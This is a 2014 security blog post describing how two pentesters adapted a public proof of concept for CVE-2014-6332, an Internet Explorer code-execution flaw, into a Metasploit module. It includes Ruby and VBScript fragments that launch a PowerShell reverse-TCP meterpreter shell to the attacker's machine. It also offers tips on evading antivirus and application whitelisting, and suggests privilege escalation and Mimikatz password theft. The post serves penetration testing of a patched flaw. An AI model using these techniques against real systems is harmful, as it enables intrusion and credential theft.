---
id: 158
title: 'CVE-2014-6332: it&#8217;s raining shells'
date: 2014-11-12T23:06:08+01:00
author: wesley
layout: post
permalink: /2014/11/cve-2014-6332-internet-explorer-msf-module/
---
This is a shared post by me ([@wesleyneelen](http://twitter.com/wesleyneelen)) and Rik van Duijn (<a href="http://twitter.com/rikvduijn" target="_blank">@rikvduijn</a>)

Today @yuange tweeted a proof of concept for CVE-2014-6223. [CVE-2014-6332](https://technet.microsoft.com/library/security/ms14-064) is a critical Internet Explorer vulnerability that was patched with MS-14-064. The POC was able to execute the application notepad.exe. We wanted to pop some actual shells with this so now the race began to find a way of executing more than just notepad of calc. The “great” thing is this vulnerability affects Windows 95 IE 3.0 until Windows 10 IE 11 from a pentesters perspective this is awesome from a blue team perspective this will make you cry.

<blockquote class="twitter-tweet" lang="nl">
  <p>
    CVE-2014-6332 alliedve.htm <a href="http://t.co/LeOhLFjnni">http://t.co/LeOhLFjnni</a> allie(win95+ie3-win10+ie11) dve copy by yuange in 2009.
  </p>
  
  <p>
    — yuange (@yuange75) <a href="https://twitter.com/yuange75/status/532407606644457472">12 november 2014</a>
  </p>
</blockquote>

We wanted to pop shells that’s why we created a Metasploit module, this allows us to adapt our exploit when needed and gives us the usability of the Metasploit framework. This gives the ability to start lots of different payloads supported by the Metasploit framework.<!--more--> To start the payloads, we decided to use Powershell. This has some advantages, Powershell is for example useful for bypassing anti-virus software, because it is able to inject payloads directly into memory. Next to this using newer versions of Windows we were unable to even run cmd.exe or other commands like ipconfig. Fun fact application whitelisting usually whitelists Powershell so use more Powershell! The original exploit runs the notepad.exe file in order to prove it was able to execute code. We modified this in order to execute the powershell.exe and inject a meterpreter into memory. First we modified the HTML page so its easy to handle within ruby, next we added the powershell.exe In order to see if it would actually execute.

{% highlight ruby %}
 def on_request_uri(cli, request)
 payl = cmd_psh_payload(payload.encoded,"x86",{ :remove_comspec => true })
 payl.slice! "powershell.exe "
{% endhighlight %}

the above code generates a complete powershell one liner for a payload we are using a reverse_tcp meterpreter shell but it could use something else.

{% highlight vbs %}
 function runmumaa()
 On Error Resume Next
 set shell=createobject("Shell.Application")
 shell.ShellExecute "powershell.exe", "#{payl}", "", "open", 1
 end function
{% endhighlight %}

The magic runmumaa() function, after safe mode is disabled this function is called and the actual shell is executed using the earlier generated Powershell payload. In the short time available to us we were unable to figure out how the exploit actually works the function setnotsafemode() seems to do the heavy lifting. Let’s see if we are able to pop a shell shall we? First we set up our exploit, we added our module to the path: /usr/share/metasploit-framework modules/exploit/windows/browser/ folder using name: ms14\_064\_ie\_olerce .rb. The module has various options which need to be configured, as stated earlier we used a reverse\_tcp meterpreter payload.

[<img class="alignnone size-full wp-image-174" src="https://forsec.nl/wp-content/uploads/2014/11/metasploit_prep.png" alt="metasploit_prep" width="1145" height="496" />](https://forsec.nl/wp-content/uploads/2014/11/metasploit_prep.png)

Next we started our handler and using internet explorer navigated to the url, we see a quick popup from powershell but this disappears quickly. Checking Netstat we see a connection to port 80 from the process “system” to our Kali VM.

[<img class="alignnone size-full wp-image-176" src="https://forsec.nl/wp-content/uploads/2014/11/netstat.png" alt="netstat" width="638" height="480" />](https://forsec.nl/wp-content/uploads/2014/11/netstat.png)

Checking metasploit we see we have gained a shell and are now able to execute system command’s maybe try out that fancy new privilege escalation exploit (exploit/windows/local/ms14\_058\_track\_popup\_menu) and use Mimikatz to read passwords in plaintext J.

[<img class="alignnone size-full wp-image-177" src="https://forsec.nl/wp-content/uploads/2014/11/shell.png" alt="shell" width="905" height="391" />](https://forsec.nl/wp-content/uploads/2014/11/shell.png)

<img class="alignnone size-full wp-image-188" src="https://forsec.nl/wp-content/uploads/2014/11/met_privesc.png" alt="met_privesc" width="736" height="201" /> 

Remember this is a quick and dirty POC Metasploit dev’s are probably yelling at their screens telling us how this is not how to build a proper module. They are right! But it works and with some work this could be a full-fledged Metasploit module.

The Metasploit module can be found here: [ms14\_064\_ie_olerce.rb](https://forsec.nl/wp-content/uploads/2014/11/ms14_064_ie_olerce.rb_.txt)

**UPDATE 28/11/2014: The module has been merged in to the [official Metasploit repository](http://www.rapid7.com/db/modules/exploit/windows/browser/ms14_064_ole_code_execution)**

_Please note: make sure to have the latest Metasploit installed._

For more details about the vulnerability: <http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows/#.VGRnQfnF9nB>